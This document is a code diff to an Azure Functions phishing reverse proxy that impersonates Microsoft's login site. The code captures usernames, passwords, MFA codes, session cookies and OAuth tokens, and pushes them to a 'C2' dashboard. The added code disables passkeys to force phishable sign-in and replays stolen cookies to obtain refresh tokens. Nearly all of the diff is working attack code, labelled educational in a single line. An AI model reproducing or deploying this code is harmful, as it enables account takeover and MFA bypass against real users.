@@ -9,23 +9,19 @@
  * Microsoft does not depend on the browser at all (avoids domain, SameSite,
  * Secure, and header-serialization issues).
  *
- * Chained with the OAuth redirect landing (ms_oauth_landing.js):
- *   1. OAuth error redirect lands victim on /login
- *   3. Proxy serves real Microsoft login pages
- *   4. Credentials, 2FA, and session cookies are captured transparently
+ * Integrates with dashboard.js for real-time C2 session management.
  *
  * This code is provided for educational/research purposes only.
  */
 
 const { app } = require("@azure/functions");
 const crypto = require("crypto");
+const { Axios } = require("axios");
+const { pushNotification, sessions } = require("./dashboard");
 
 const upstream = "login.microsoftonline.com";
 const upstream_path = "/";
-const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;
 
-// Headers to strip from upstream responses — removes security controls
-// that would interfere with the proxy
 const delete_headers = [
   "content-security-policy",
   "content-security-policy-report-only",
@@ -36,18 +32,28 @@ const delete_headers = [
   "content-length",
   "content-encoding",
   "Set-Cookie",
-  "transfer-encoding", // <- this sneaky mofo
+  "transfer-encoding",
 ];
 
-// Track captured sessions to avoid duplicate notifications
-const capturedSessions = new Set();
+function esc(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }
 
-// Server-side cookie jar — stores all upstream cookies per victim session.
-// Set a custom cookie to store the session data that needs forwarded to Microsoft
+function supersedeStale(activeSessionId, upn, context) {
+  if (!upn || upn === "unknown") return;
+  const upnLower = upn.toLowerCase();
+  for (const [sid, s] of sessions) {
+    if (sid !== activeSessionId && s.user?.upn?.toLowerCase() === upnLower && !s.refreshToken && s.status !== "superseded") {
+      s.status = "superseded";
+      context.log(`Superseded stale session ${sid} for ${upn}`);
+    }
+  }
+}
+
+const capturedSessions = new Set();
+const executedSessions = new Set();
+
 const cookieJars = new Map();
 const SESSION_COOKIE_NAME = "__proxy_sid";
 
-// Clean up expired sessions
 setInterval(() => {
   const cutoff = Date.now() - 30 * 60 * 1000;
   for (const [id, session] of cookieJars) {
@@ -63,7 +69,7 @@ function getOrCreateSession(request) {
 
   if (!sessionId || !cookieJars.has(sessionId)) {
     sessionId = crypto.randomUUID();
-    cookieJars.set(sessionId, { cookies: new Map(), lastSeen: Date.now() });
+    cookieJars.set(sessionId, { cookies: new Map(), lastSeen: Date.now(), credentials: {} });
     isNew = true;
   } else {
     cookieJars.get(sessionId).lastSeen = Date.now();
@@ -83,7 +89,6 @@ function updateJar(sessionId, setCookieHeaders) {
     const name = nameValue.substring(0, eqIndex).trim();
     const value = nameValue.substring(eqIndex + 1);
 
-    // Detect cookie deletion (empty value, expires in epoch, max-age=0)
     const isExpired = /expires\s*=\s*Thu,\s*01[\s-]Jan[\s-]1970/i.test(header);
     const maxAgeZero = /max-age\s*=\s*0/i.test(header);
 
@@ -107,95 +112,41 @@ function sessionTrackingCookie(sessionId, isSecure) {
   return `${SESSION_COOKIE_NAME}=${sessionId}; path=/; HttpOnly; SameSite=Lax${isSecure ? "; Secure" : ""}`;
 }
 
-// Adaptive Card dispatch for Teams notifications
-async function dispatchMessage(context, message) {
-  context.log(message);
-  if (!teams_webhook_url) return;
-
-  const plainText = message
-    .replace(/<br>/gi, "\n")
-    .replace(/<b>/gi, "**")
-    .replace(/<\/b>/gi, "**")
-    .replace(/<code>/gi, "`")
-    .replace(/<\/code>/gi, "`")
-    .replace(/<[^>]*>/g, "");
-
-  const payload = {
-    type: "message",
-    attachments: [{
-      contentType: "application/vnd.microsoft.card.adaptive",
-      content: {
-        "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
-        type: "AdaptiveCard",
-        version: "1.4",
-        body: [{ type: "TextBlock", text: plainText, wrap: true }],
-      },
-    }],
-  };
-
-  try {
-    let resp = await fetch(teams_webhook_url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-    if (!resp.ok) {
-      await fetch(teams_webhook_url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ text: message }),
-      });
-    }
-  } catch (err) {
-    context.log(`Webhook error: ${err.message}`);
-  }
-}
-
-// Response body rewriting — replaces upstream references with proxy host
 function rewriteBody(text, upstreamHost, proxyOrigin) {
   let result = text;
   const proxyHost = proxyOrigin.replace(/^https?:\/\//, "");
 
-  // Replace full URLs
   result = result.replace(
     new RegExp(`https://${escapeRegex(upstreamHost)}`, "g"),
     proxyOrigin
   );
 
-  // Replace protocol-relative URLs
   result = result.replace(
     new RegExp(`//${escapeRegex(upstreamHost)}`, "g"),
     proxyOrigin.replace(/^https?:/, "")
   );
 
-  // Replace unicode-escaped URLs (common in Microsoft's inline JS)
   result = result.replace(
     new RegExp(`https:\\\\u002f\\\\u002f${escapeRegex(upstreamHost)}`, "g"),
     proxyOrigin.replace(/\//g, "\\u002f").replace(":", ":")
   );
 
-  // Replace bare hostname references in JavaScript strings
   result = result.replace(
     new RegExp(`"${escapeRegex(upstreamHost)}"`, "g"),
     `"${proxyHost}"`
   );
 
-  // Handle URL-encoded references (common in Microsoft's $Config JSON and inline params)
   result = result.replace(
     new RegExp(escapeRegex(upstreamHost) + "%2[fF]", "g"),
     proxyHost + "%2F"
   );
 
-  // Also handle login.microsoft.com (alternate domain)
   result = result.replace(/https:\/\/login\.microsoft\.com/g, proxyOrigin);
   result = result.replace(/\/\/login\.microsoft\.com/g, proxyOrigin.replace(/^https?:/, ""));
 
-  // Strip Subresource Integrity (SRI) attributes — these would cause
-  // browsers to reject our rewritten scripts/stylesheets
   result = result.replace(/\s+integrity="[^"]*"/g, "");
   result = result.replace(/\s+integrity='[^']*'/g, "");
 
-  // Strip crossorigin attributes (not needed when same-origin via proxy)
   result = result.replace(/\s+crossorigin="[^"]*"/g, "");
   result = result.replace(/\s+crossorigin='[^']*'/g, "");
   result = result.replace(/\s+crossorigin(?=[\s>])/g, "");
@@ -203,16 +154,13 @@ function rewriteBody(text, upstreamHost, proxyOrigin) {
   return result;
 }
 
-// Reverse-rewrite: proxy host back to upstream (for POST bodies sent to Microsoft)
 function reverseRewriteBody(text, upstreamHost, proxyOrigin) {
   const proxyHost = proxyOrigin.replace(/^https?:\/\//, "");
   let result = text;
 
-  // Replace proxy URLs back to upstream
   result = result.replace(new RegExp(escapeRegex(proxyOrigin), "g"), `https://${upstreamHost}`);
   result = result.replace(new RegExp(escapeRegex(proxyHost), "g"), upstreamHost);
 
-  // URL-encoded proxy references back to upstream
   result = result.replace(
     new RegExp(escapeRegex(encodeURIComponent(proxyOrigin)), "g"),
     encodeURIComponent(`https://${upstreamHost}`)
@@ -229,17 +177,13 @@ function escapeRegex(str) {
   return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 }
 
-// Cookie processing — rewrite domains, normalize paths (for browser copy)
 function processCookies(originalCookies, upstreamHost, proxyHost, isSecure) {
   const processed = [];
 
   for (const cookie of originalCookies) {
     let modified = cookie;
 
-    // Remove domain restrictions so cookies are host-only on proxy domain
     modified = modified.replace(/;\s*domain=[^;]+/gi, "");
-
-    // Normalize path to / so cookies are sent on all proxy requests.
     modified = modified.replace(/;\s*path=[^;]+/gi, "; path=/");
 
     if (!/;\s*path\s*=/i.test(modified)) {
@@ -250,7 +194,6 @@ function processCookies(originalCookies, upstreamHost, proxyHost, isSecure) {
       modified = modified.replace(/;\s*samesite\s*=\s*none/gi, "; SameSite=Lax");
     }
 
-    // Remove Secure flag on HTTP connections so browser accepts cookies
     if (!isSecure) {
       modified = modified.replace(/;\s*secure/gi, "");
     }
@@ -261,7 +204,6 @@ function processCookies(originalCookies, upstreamHost, proxyHost, isSecure) {
   return processed;
 }
 
-// Credential extraction from POST body
 function extractCredentials(body) {
   const pairs = body.split("&");
   const result = {};
@@ -282,7 +224,6 @@ function extractCredentials(body) {
   return result;
 }
 
-// Client-side injection script — handles dynamic URL rewriting
 function getInjectionScript(proxyOrigin) {
   const isSecureProxy = proxyOrigin.startsWith("https:");
   return `
@@ -302,9 +243,6 @@ function getInjectionScript(proxyOrigin) {
     return u;
   }
 
-  // Intercept document.cookie setter — Microsoft's JS sets cookies with
-  // domain=.login.microsoftonline.com which the browser silently rejects
-  // on the proxy domain. Strip domain so cookies are set as host-only.
   var cd=Object.getOwnPropertyDescriptor(Document.prototype,'cookie')||
          Object.getOwnPropertyDescriptor(HTMLDocument.prototype,'cookie');
   if(cd&&cd.set){
@@ -322,7 +260,20 @@ function getInjectionScript(proxyOrigin) {
     });
   }
 
-  // Intercept fetch
+  // Neutralize WebAuthn/passkeys — FIDO is stripped server-side from
+  // GetCredentialType responses; this blocks the browser APIs as a safety net.
+  delete window.PublicKeyCredential;
+  if(navigator.credentials){
+    navigator.credentials.get=function(opts){
+      if(opts&&opts.publicKey)return new Promise(function(){});
+      return Promise.reject(new DOMException("Not supported","NotSupportedError"));
+    };
+    navigator.credentials.create=function(opts){
+      if(opts&&opts.publicKey)return new Promise(function(){});
+      return Promise.reject(new DOMException("Not supported","NotSupportedError"));
+    };
+  }
+
   var _fetch=window.fetch;
   window.fetch=function(url,opts){
     if(typeof url==="string")url=rw(url);
@@ -330,24 +281,20 @@ function getInjectionScript(proxyOrigin) {
     return _fetch.call(this,url,opts);
   };
 
-  // Intercept XMLHttpRequest
   var _open=XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open=function(m,u){
     arguments[1]=rw(u);
     return _open.apply(this,arguments);
   };
 
-  // Intercept location changes
   var _assign=window.location.assign;
   var _replace=window.location.replace;
   if(_assign)window.location.assign=function(u){return _assign.call(window.location,rw(u));};
   if(_replace)window.location.replace=function(u){return _replace.call(window.location,rw(u));};
 
-  // Intercept window.open
   var _wopen=window.open;
   window.open=function(u,n,f){return _wopen.call(window,rw(u),n,f);};
 
-  // Intercept form submissions — rewrite action URLs
   document.addEventListener("submit",function(e){
     var f=e.target;
     if(f&&f.action&&typeof f.action==="string"){
@@ -355,7 +302,6 @@ function getInjectionScript(proxyOrigin) {
     }
   },true);
 
-  // Watch for dynamically added elements with src/href attributes
   var obs=new MutationObserver(function(muts){
     muts.forEach(function(m){
       m.addedNodes.forEach(function(n){
@@ -387,13 +333,14 @@ app.http("phishing", {
     const proxyOrigin = `${original_url.protocol}//${original_url.host}`;
     const isSecure = original_url.protocol === "https:";
 
-    // Get or create server-side session for cookie jar
     const { sessionId, isNew } = getOrCreateSession(request);
     if (isNew) {
-      context.log(`New proxy session: ${sessionId}`);
+      const ip = request.headers.get("x-forwarded-for") || "unknown";
+      const ua = request.headers.get("user-agent") || "unknown";
+      context.log(`New proxy session: ${sessionId} | IP: ${ip} | UA: ${ua}`);
+      pushNotification("info", `<b>New Session</b><br><b>IP:</b> ${ip}<br><b>UA:</b> ${ua}`, { sessionId });
     }
 
-    // Rewrite to upstream Microsoft login
     upstream_url.host = upstream;
     upstream_url.port = 443;
     upstream_url.protocol = "https:";
@@ -404,39 +351,35 @@ app.http("phishing", {
       upstream_url.pathname = upstream_path + upstream_url.pathname;
     }
 
-    // Fix double-slash from path concatenation
     upstream_url.pathname = upstream_url.pathname.replace(/\/\//g, "/");
 
     context.log(`Proxying ${request.method}: ${original_url.pathname} -> ${upstream_url.href}`);
 
-    // Intercept nativeclient redirect — this means auth completed successfully.
-    // Microsoft redirects to /common/oauth2/nativeclient?code=... after login.
-    // We capture the auth code and can exchange it for tokens.
+    // Enhanced logging for MFA flow debugging
+    if (original_url.pathname.includes("/SAS/") || original_url.pathname.includes("/GetCredentialType") || original_url.pathname.includes("/nativeclient") || original_url.pathname.includes("/kmsi")) {
+      context.log(`=== AUTH FLOW REQUEST === ${request.method} ${original_url.pathname}`);
+    }
+
     if (original_url.pathname.includes("/oauth2/nativeclient") || original_url.pathname.includes("/oauth/nativeclient")) {
+      context.log(`=== NATIVECLIENT HIT === params: code=${original_url.searchParams.has("code")} error=${original_url.searchParams.get("error") || "none"}`);
       const authCode = original_url.searchParams.get("code");
       const authError = original_url.searchParams.get("error");
 
       if (authCode) {
         context.log("=== AUTH CODE CAPTURED ===");
         context.log("Code:", authCode);
+        pushNotification("auth_code", `<b>AUTH CODE CAPTURED</b><br><b>Code:</b> <code>${authCode}</code>`, { sessionId });
 
-        await dispatchMessage(context,
-          `<b>AUTH CODE CAPTURED</b><br>` +
-          `<b>Code:</b> <code>${authCode}</code><br>` +
-          `Authentication completed successfully through proxy.`
-        );
-
-        // Exchange auth code for tokens
         try {
           const tokenResp = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/token", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: new URLSearchParams({
-              client_id: "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
+              client_id: CLIENT_ID,
               grant_type: "authorization_code",
               code: authCode,
-              redirect_uri: "https://login.microsoftonline.com/common/oauth2/nativeclient",
-              scope: "openid profile",
+              redirect_uri: REDIRECT_URI,
+              scope: "openid profile offline_access https://graph.microsoft.com/.default",
             }).toString(),
           });
           const tokens = await tokenResp.json();
@@ -447,24 +390,72 @@ app.http("phishing", {
             context.log("Refresh Token:", tokens.refresh_token ? "present" : "none");
 
             let userInfo = "unknown";
+            let userClaims = {};
             if (tokens.id_token) {
               try {
-                const claims = JSON.parse(
+                userClaims = JSON.parse(
                   Buffer.from(tokens.id_token.split(".")[1], "base64url").toString("utf-8")
                 );
-                userInfo = claims.preferred_username || claims.upn || claims.email || "unknown";
+                userInfo = userClaims.preferred_username || userClaims.upn || userClaims.email || "unknown";
                 context.log("User:", userInfo);
-                context.log("Tenant:", claims.tid || "unknown");
+                context.log("Tenant:", userClaims.tid || "unknown");
               } catch (e) {}
             }
 
-            await dispatchMessage(context,
+            pushNotification("tokens",
               `<b>TOKENS CAPTURED (Auth Code Exchange)</b><br>` +
               `<b>User:</b> ${userInfo}<br>` +
               `<b>Access Token:</b> <code>${tokens.access_token}</code><br>` +
               `<b>Refresh Token:</b> ${tokens.refresh_token ? "present" : "none"}<br>` +
-              `<b>Scopes:</b> ${tokens.scope || "N/A"}`
+              `<b>Scopes:</b> ${tokens.scope || "N/A"}`,
+              { user: userInfo, sessionId }
             );
+
+            // Update existing hooked session or create one
+            // Reverse so we prefer the most-recently-created session for this user
+            const jar = cookieJars.get(sessionId);
+            const existing = Array.from(sessions.values()).reverse().find(s =>
+              s.cookieArray && jar && s.credentials?.username === jar.credentials?.username && s.credentials?.username
+            );
+            if (existing) {
+              existing.refreshToken = tokens.refresh_token || existing.refreshToken;
+              existing.lastTokenRefresh = Date.now();
+              existing.user = {
+                upn: userInfo,
+                name: userClaims.name || existing.user.name,
+                tid: userClaims.tid || existing.user.tid,
+                jobTitle: userClaims.jobTitle || null,
+                department: userClaims.department || null,
+              };
+              context.log(`Updated existing session ${existing.id} with auth code tokens`);
+              supersedeStale(existing.id, userInfo, context);
+            } else {
+              const hookSessionId = crypto.randomUUID();
+              sessions.set(hookSessionId, {
+                id: hookSessionId,
+                capturedAt: Date.now(),
+                lastTokenRefresh: Date.now(),
+                status: "active",
+                user: {
+                  upn: userInfo,
+                  name: userClaims.name || "unknown",
+                  tid: userClaims.tid || "unknown",
+                  jobTitle: userClaims.jobTitle || null,
+                  department: userClaims.department || null,
+                },
+                refreshToken: tokens.refresh_token || null,
+                clientId: CLIENT_ID,
+                resources: {},
+                recon: {},
+                credentials: jar?.credentials || {},
+                cookieArray: jar ? Array.from(jar.cookies.entries()).map(([k, v]) => `${k}=${v}`) : [],
+              });
+              pushNotification("execution",
+                `<b>SESSION HOOKED</b><br><b>User:</b> ${userInfo}<br><b>Session:</b> ${hookSessionId}`,
+                { user: userInfo }
+              );
+              supersedeStale(hookSessionId, userInfo, context);
+            }
           } else if (tokens.error) {
             context.log("Token exchange error:", tokens.error, tokens.error_description);
           }
@@ -477,24 +468,7 @@ app.http("phishing", {
         context.log("Auth error at nativeclient:", authError);
       }
 
-      // Also log any session cookies we accumulated in the jar
-      const jar = cookieJars.get(sessionId);
-      if (jar) {
-        const jarNames = Array.from(jar.cookies.keys());
-        context.log(`Session jar at completion: [${jarNames.join(", ")}]`);
-
-        // Log captured session cookies from the jar
-        const sessionCookieNames = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"];
-        const capturedFromJar = sessionCookieNames.filter(n => jar.cookies.has(n));
-        if (capturedFromJar.length > 0) {
-          const cookieValues = capturedFromJar.map(n => `${n}=${jar.cookies.get(n)}`);
-          await dispatchMessage(context,
-            `<b>SESSION COOKIES FROM JAR</b><br>` +
-            `<b>Cookies:</b> ${capturedFromJar.join(", ")}<br><br>` +
-            `<code>${cookieValues.map(c => c).join("\n")}</code>`
-          );
-        }
-      }
+      triggerExecution(sessionId, context);
 
       const completionHtml = `<!DOCTYPE html>
 <html><head><meta charset="utf-8"><title>Sign in</title>
@@ -529,24 +503,28 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
         context.log("=== CREDENTIALS CAPTURED ===");
         context.log("Username:", creds.username);
         context.log("Password:", creds.password);
-        await dispatchMessage(context,
-          `<b>CREDENTIALS CAPTURED</b><br>` +
-          `<b>Username:</b> ${creds.username}<br>` +
-          `<b>Password:</b> ${creds.password}`
+        const jar = cookieJars.get(sessionId);
+        if (jar) { jar.credentials.username = creds.username; jar.credentials.password = creds.password; }
+        pushNotification("credentials",
+          `<b>CREDENTIALS CAPTURED</b><br><b>Username:</b> ${esc(creds.username)}<br><b>Password:</b> ${esc(creds.password)}`,
+          { user: creds.username, sessionId }
         );
       }
 
       if (creds.mfaCode) {
         context.log("=== MFA CODE CAPTURED ===");
         context.log("Code:", creds.mfaCode);
-        await dispatchMessage(context,
-          `<b>MFA CODE CAPTURED</b><br>` +
-          `<b>Code:</b> ${creds.mfaCode}<br>` +
-          `<b>User:</b> ${creds.username || "unknown"}`
+        const jar = cookieJars.get(sessionId);
+        if (jar) {
+          jar.credentials.mfaCode = creds.mfaCode;
+          if (creds.username && !jar.credentials.username) jar.credentials.username = creds.username;
+        }
+        pushNotification("mfa",
+          `<b>MFA CODE CAPTURED</b><br><b>Code:</b> ${creds.mfaCode}<br><b>User:</b> ${creds.username || "unknown"}`,
+          { user: creds.username || "unknown", sessionId }
         );
       }
 
-      // Reverse-rewrite POST body: proxy URLs back to upstream Microsoft URLs.
       requestBody = reverseRewriteBody(requestBody, upstream, proxyOrigin);
     }
 
@@ -555,7 +533,6 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
     new_request_headers.set("Host", upstream);
     new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
 
-    // Rewrite Referer to upstream, preserving the full path.
     const clientReferer = request.headers.get("referer");
     if (clientReferer) {
       new_request_headers.set("Referer", clientReferer.replace(proxyOrigin, `https://${upstream}`));
@@ -564,18 +541,14 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
     }
     new_request_headers.set("Origin", `https://${upstream}`);
 
-    // Use server-side cookie jar instead of browser cookies.
     const jarCookies = getJarCookieHeader(sessionId);
     if (jarCookies) {
       new_request_headers.set("Cookie", jarCookies);
       context.log(`Forwarding ${cookieJars.get(sessionId)?.cookies.size || 0} jar cookies for ${original_url.pathname}`);
     } else {
-      // No jar cookies yet — forward whatever the browser sent as fallback
       context.log(`No jar cookies yet, forwarding browser cookies for ${original_url.pathname}`);
     }
 
-    // Remove our session tracking cookie from the forwarded Cookie header
-    // (Microsoft doesn't need it and shouldn't see it)
     const cookieHeader = new_request_headers.get("Cookie") || "";
     if (cookieHeader.includes(SESSION_COOKIE_NAME)) {
       const cleaned = cookieHeader
@@ -586,7 +559,6 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
       new_request_headers.set("Cookie", cleaned);
     }
 
-    // Forward the browser's real User-Agent (only override if missing)
     const clientUA = request.headers.get("user-agent") || "";
     if (!clientUA) {
       new_request_headers.set("user-agent",
@@ -613,22 +585,20 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
       return new Response("Service temporarily unavailable", { status: 502 });
     }
 
-    // WebSocket passthrough
     if (request.headers.get("Upgrade")?.toLowerCase() === "websocket") {
       return original_response;
     }
 
-    // Capture upstream Set-Cookie headers into the server-side jar
     const upstreamSetCookies = original_response.headers.getSetCookie?.() || [];
     if (upstreamSetCookies.length > 0) {
       updateJar(sessionId, upstreamSetCookies);
       context.log(`Jar updated: +${upstreamSetCookies.length} cookies (${original_url.pathname}) — jar now has ${cookieJars.get(sessionId)?.cookies.size || 0} cookies`);
     }
 
-    // Check for session cookie capture
-    checkSessionCookies(upstreamSetCookies, context);
+    checkSessionCookies(upstreamSetCookies, sessionId, context);
+    triggerExecution(sessionId, context);
 
-    // Handle redirects — rewrite Location header to stay on proxy
+    // Handle redirects
     if (original_response.status >= 300 && original_response.status < 400) {
       const location = original_response.headers.get("Location");
       if (location) {
@@ -637,13 +607,10 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
 
         const redirectHeaders = new Headers();
 
-        // Forward processed cookies to browser (for client-side JS access)
         const processedRedirectCookies = processCookies(upstreamSetCookies, upstream, original_url.host, isSecure);
         for (const c of processedRedirectCookies) {
           redirectHeaders.append("Set-Cookie", c);
         }
-
-        // Always set session tracking cookie
         redirectHeaders.append("Set-Cookie", sessionTrackingCookie(sessionId, isSecure));
 
         redirectHeaders.set("Location", rewrittenLocation);
@@ -662,27 +629,43 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
     new_response_headers.set("access-control-allow-origin", "*");
     new_response_headers.set("access-control-allow-credentials", "true");
 
-    // Forward processed cookies to browser (for client-side JS access)
     const processedCookies = processCookies(upstreamSetCookies, upstream, original_url.host, isSecure);
     for (const cookie of processedCookies) {
       new_response_headers.append("Set-Cookie", cookie);
     }
-
-    // Always set session tracking cookie
     new_response_headers.append("Set-Cookie", sessionTrackingCookie(sessionId, isSecure));
 
     // Rewrite response body
     const contentType = original_response.headers.get("content-type") || "";
 
-    // Only rewrite text-based responses
     if (contentType.includes("text/") || contentType.includes("javascript") ||
         contentType.includes("json") || contentType.includes("xml")) {
 
       let body = await original_response.text();
       body = rewriteBody(body, upstream, proxyOrigin);
 
-      // Inject client-side URL rewriting script into HTML pages
+      // Strip FIDO/passkey from GetCredentialType API responses
+      if (contentType.includes("json") && original_url.pathname.includes("GetCredentialType")) {
+        try {
+          const credObj = JSON.parse(body);
+          if (credObj.Credentials) {
+            delete credObj.Credentials.FidoParams;
+            credObj.Credentials.HasFido = false;
+            delete credObj.Credentials.RemoteNgcParams;
+          }
+          if ("IsFidoSupported" in credObj) credObj.IsFidoSupported = false;
+          body = JSON.stringify(credObj);
+          context.log("Stripped FIDO from GetCredentialType response");
+        } catch (e) {}
+      }
+
       if (contentType.includes("text/html")) {
+        // Strip FIDO/passkey references from inline $Config
+        body = body.replace(/"IsFidoSupported"\s*:\s*true/g, '"IsFidoSupported":false');
+        body = body.replace(/"HasFido"\s*:\s*true/g, '"HasFido":false');
+        // FidoParams object has nested braces — don't regex it; HasFido:false is sufficient
+        body = body.replace(/"isFidoSupported"\s*:\s*true/gi, '"isFidoSupported":false');
+
         const injectionScript = getInjectionScript(proxyOrigin);
         if (body.includes("<head>")) {
           body = body.replace("<head>", "<head>" + injectionScript);
@@ -699,7 +682,6 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
       });
     }
 
-    // Binary content (images, fonts, etc.) — pass through unchanged
     return new Response(original_response.body, {
       status: original_response.status,
       headers: new_response_headers,
@@ -707,8 +689,142 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
   },
 });
 
-// Session cookie detection
-function checkSessionCookies(cookies, context) {
+const CLIENT_ID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
+const REDIRECT_URI = "https://login.microsoftonline.com/common/oauth2/nativeclient";
+const REPLAY_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
+
+async function replaySessionForTokens(cookieArray, context) {
+  const authUrl = "https://login.microsoftonline.com/common/oauth2/authorize?" +
+    new URLSearchParams({
+      response_type: "code",
+      client_id: CLIENT_ID,
+      resource: "https://graph.microsoft.com/",
+      redirect_uri: REDIRECT_URI,
+      state: crypto.randomUUID(),
+    }).toString();
+
+  const client = new Axios({
+    headers: {
+      "cookie": cookieArray.join("; "),
+      "User-Agent": REPLAY_UA,
+    },
+    maxRedirects: 10,
+  });
+
+  const response = await client.get(authUrl);
+  const finalUrl = response.request?._redirectable?._currentUrl || response.request?.res?.responseUrl || "";
+  context.log(`Cookie replay final URL: ${finalUrl.substring(0, 200)}`);
+
+  const code = new URLSearchParams(finalUrl.split("?")[1] || "").get("code");
+  if (!code) {
+    const error = new URLSearchParams(finalUrl.split("?")[1] || "").get("error");
+    context.log(`Cookie replay: no auth code — ${error || "redirect did not reach nativeclient"}`);
+    return null;
+  }
+
+  context.log("Auth code from cookie replay:", code);
+  const tokenResp = await fetch("https://login.microsoftonline.com/common/oauth2/token", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: new URLSearchParams({
+      client_id: CLIENT_ID,
+      grant_type: "authorization_code",
+      code: code,
+      redirect_uri: REDIRECT_URI,
+      resource: "https://graph.microsoft.com/",
+    }).toString(),
+  });
+  return tokenResp.json();
+}
+
+function triggerExecution(sessionId, context) {
+  if (executedSessions.has(sessionId)) return;
+  const jar = cookieJars.get(sessionId);
+  if (!jar || jar.cookies.size === 0) return;
+  if (!jar.cookies.has("ESTSAUTHPERSISTENT")) return;
+
+  executedSessions.add(sessionId);
+
+  const cookieArray = Array.from(jar.cookies.entries()).map(([k, v]) => `${k}=${v}`);
+  context.log(`Session ${sessionId}: MS auth complete. ${cookieArray.length} cookies captured.`);
+
+  const msNames = ["ESTSAUTHPERSISTENT", "ESTSAUTH", "SignInStateCookie"];
+  const pick = (names) => cookieArray.filter(c => names.some(n => c.startsWith(n + "="))).map(c => `<code>${c}</code>`);
+
+  let html = `<b>FULL SESSION CAPTURED (${cookieArray.length} cookies)</b><br><br>`;
+  html += `<b style="color:#39d2c0">Microsoft Session:</b><br>${pick(msNames).join("<br>")}`;
+  pushNotification("session_cookies", html, { sessionId });
+
+  const hookSessionId = crypto.randomUUID();
+  sessions.set(hookSessionId, {
+    id: hookSessionId,
+    capturedAt: Date.now(),
+    lastTokenRefresh: null,
+    status: "active",
+    user: { upn: jar.credentials?.username || "unknown", name: "unknown", tid: "unknown" },
+    refreshToken: null,
+    clientId: CLIENT_ID,
+    resources: {},
+    recon: {},
+    credentials: jar.credentials || {},
+    cookieArray: cookieArray,
+  });
+  pushNotification("execution",
+    `<b>SESSION HOOKED</b><br><b>User:</b> ${jar.credentials?.username || "unknown"}<br><b>Session:</b> ${hookSessionId}`,
+    { user: jar.credentials?.username || "unknown" }
+  );
+
+  // Replay captured cookies server-side to obtain a refresh token
+  replaySessionForTokens(cookieArray, context).then(async (tokens) => {
+    const s = sessions.get(hookSessionId);
+    if (!s) return;
+    if (!tokens?.access_token) {
+      context.log(`Cookie replay: no tokens obtained — ${tokens?.error || "unknown error"}`);
+      if (tokens?.error_description) context.log(`  ${tokens.error_description}`);
+      return;
+    }
+
+    s.refreshToken = tokens.refresh_token || null;
+    s.lastTokenRefresh = Date.now();
+
+    if (tokens.id_token) {
+      try {
+        const claims = JSON.parse(Buffer.from(tokens.id_token.split(".")[1], "base64url").toString("utf-8"));
+        s.user.upn = claims.upn || claims.preferred_username || s.user.upn;
+        s.user.name = claims.name || s.user.name;
+        s.user.tid = claims.tid || s.user.tid;
+      } catch (e) {}
+    }
+
+    // Enrich user profile from Graph API
+    try {
+      const me = await fetch("https://graph.microsoft.com/v1.0/me", {
+        headers: { "Authorization": "Bearer " + tokens.access_token, "User-Agent": REPLAY_UA },
+      }).then(r => r.json());
+
+      if (me.userPrincipalName) {
+        s.user.upn = me.userPrincipalName;
+        s.user.name = me.displayName || s.user.name;
+        s.user.jobTitle = me.jobTitle || null;
+        s.user.department = me.department || null;
+        s.user.tid = me.tid || s.user.tid;
+        context.log(`User enriched: ${me.displayName} (${me.userPrincipalName})`);
+      }
+    } catch (e) {
+      context.log(`Graph /me enrichment failed: ${e.message}`);
+    }
+
+    pushNotification("tokens",
+      `<b>TOKENS FROM COOKIE REPLAY</b><br><b>User:</b> ${s.user.upn} (${s.user.name})<br><b>Refresh Token:</b> ${s.refreshToken ? "present" : "none"}`,
+      { user: s.user.upn }
+    );
+    context.log(`Session ${hookSessionId}: refresh token obtained via cookie replay`);
+  }).catch(err => {
+    context.log(`Cookie replay failed: ${err.message}`);
+  });
+}
+
+function checkSessionCookies(cookies, sessionId, context) {
   const sessionCookieNames = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"];
   const found = [];
 
@@ -732,10 +848,11 @@ function checkSessionCookies(cookies, context) {
       .filter(c => sessionCookieNames.some(n => c.startsWith(`${n}=`)))
       .map(c => c.split(";")[0]);
 
-    dispatchMessage(context,
-      `<b>SESSION COOKIES CAPTURED</b><br>` +
-      `<b>Cookies:</b> ${found.join(", ")}<br><br>` +
-      `<code>${cookieValues.join("\n")}</code>`
+    pushNotification("session_cookies",
+      `<b>SESSION COOKIES CAPTURED</b><br><b>Cookies:</b> ${found.join(", ")}<br><br><code>${cookieValues.join("\n")}</code>`,
+      { sessionId }
     );
+
+    triggerExecution(sessionId, context);
   }
 }
